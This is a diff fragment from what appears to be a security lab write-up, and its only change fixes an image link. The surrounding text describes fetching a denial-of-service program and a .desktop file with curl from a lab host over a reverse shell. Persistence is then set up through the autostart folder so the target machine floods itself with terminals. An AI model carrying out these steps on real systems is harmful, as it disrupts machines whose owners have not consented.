@@ -67,7 +67,7 @@ Using the reverse shell, now, it is easy to download the `dos.c` program and the
 `curl -O "http://10.0.2.2/demo/dos.desktop"`
 now, the dos.c program is compiled using the `ggc -o dos dos.c` command, thus creating the executable. Before running it, however, persistence must be created: the `dos.desktop` file is moved to `.config/autostart`, to do this the `mv` command is used, which must, however, be executed with administrator privileges, therefore using `sudo`, this implies that the attacker must know the account password. Once `dos.desktop` is moved, the `dos` program is visible in Startup Application Preferences, which shows the programs that are run at the machine startup.
 
-![Startup Application Preferences]
+![Startup Application Preferences](images/application-startup.png)
 
 So, every time the machine is accessed, countless terminal windows will be opened in a loop, making it unusable.
 
